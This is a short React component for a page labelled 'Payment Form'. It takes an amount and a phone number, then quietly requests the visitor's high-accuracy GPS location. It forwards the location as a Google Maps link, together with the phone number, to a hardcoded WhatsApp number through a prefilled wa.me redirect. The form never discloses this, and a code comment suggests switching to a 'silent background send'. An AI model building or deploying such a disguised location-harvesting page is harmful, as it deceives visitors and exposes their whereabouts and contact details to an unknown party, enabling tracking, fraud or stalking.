import { useState } from 'react'
import './App.css'

const TARGET_WA = '6288229793327'

export default function App() {
  const [data, setData] = useState({ nominal: '', phone: '' })
  const [loading, setLoading] = useState(false)

  // ponytail: wa.me deep link redirect; add WhatsApp Business Cloud API if silent background send needed
  const redirectWhatsApp = (nominal, phone, locationStr) => {
    const message = `Halo, form baru masuk:\n- Nominal: Rp ${Number(nominal).toLocaleString('id-ID')}\n- Nomor Telepon: ${phone}\n- Lokasi: ${locationStr}`
    window.location.href = `https://wa.me/${TARGET_WA}?text=${encodeURIComponent(message)}`
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    setLoading(true)

    if (!navigator.geolocation) {
      redirectWhatsApp(data.nominal, data.phone, 'Tidak didukung browser')
      return
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const mapsUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        redirectWhatsApp(data.nominal, data.phone, mapsUrl)
      },
      () => {
        redirectWhatsApp(data.nominal, data.phone, 'Izin lokasi ditolak / gagal')
      },
      { enableHighAccuracy: true, timeout: 8000 }
    )
  }

  return (
    <main className="container">
      <h1>Payment Form</h1>
      <form onSubmit={handleSubmit}>
        <label>
          Nominal (Rp)
          <input
            type="number"
            min="1"
            required
            value={data.nominal}
            onChange={(e) => setData({ ...data, nominal: e.target.value })}
            placeholder="100000"
          />
        </label>

        <label>
          Phone Number
          <input
            type="tel"
            required
            value={data.phone}
            onChange={(e) => setData({ ...data, phone: e.target.value })}
            placeholder="081234567890"
          />
        </label>

        <button type="submit" disabled={loading}>
          {loading ? 'Submitting...' : 'Submit'}
        </button>
      </form>
    </main>
  )
}
